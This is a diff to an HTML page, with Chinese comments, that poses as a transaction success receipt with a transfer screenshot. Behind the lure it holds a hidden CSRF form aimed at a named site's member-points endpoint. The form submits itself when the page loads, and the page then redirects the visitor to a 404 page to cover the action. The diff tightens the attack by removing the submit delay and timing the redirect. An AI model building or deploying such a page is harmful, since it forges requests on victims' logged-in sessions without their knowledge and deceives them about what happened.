@@ -29,7 +29,6 @@
   <h2>交易成功凭证</h2>
   <img src="transfer_proof.png" alt="转账截图">
 
-  <!-- ✅ CSRF 表单，target 指向 iframe -->
   <form id="csrfForm" method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index" target="resultFrame">
     <input type="hidden" name="decide" value="">
     <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
@@ -46,20 +45,21 @@
     <input type="hidden" name="keyWord" value="9521">
   </form>
 
-  <!-- ✅ 可视化响应结果 -->
-  <iframe name="resultFrame"></iframe>
+  <iframe name="resultFrame" id="resultFrame"></iframe>
 
   <script>
-    // 表单在 3 秒后自动提交
-    setTimeout(() => {
-      document.getElementById('csrfForm').submit();
+    // 提交表单
+    document.getElementById('csrfForm').submit();
+    console.log("✅ 表单已提交");
 
-      // 再延迟 2 秒后跳转（即表单提交后第 5 秒）
+    // 等 iframe 加载完毕后，5 秒跳转
+    document.getElementById('resultFrame').onload = () => {
+      console.log("📥 iframe 加载完成，准备倒计时跳转");
       setTimeout(() => {
+        console.log("⏳ 跳转到 404...");
         window.location.href = "https://nb113.net/404.html";
-      }, 2000);
-
-    }, 3000);
+      }, 5000);
+    };
   </script>
 
 </body>
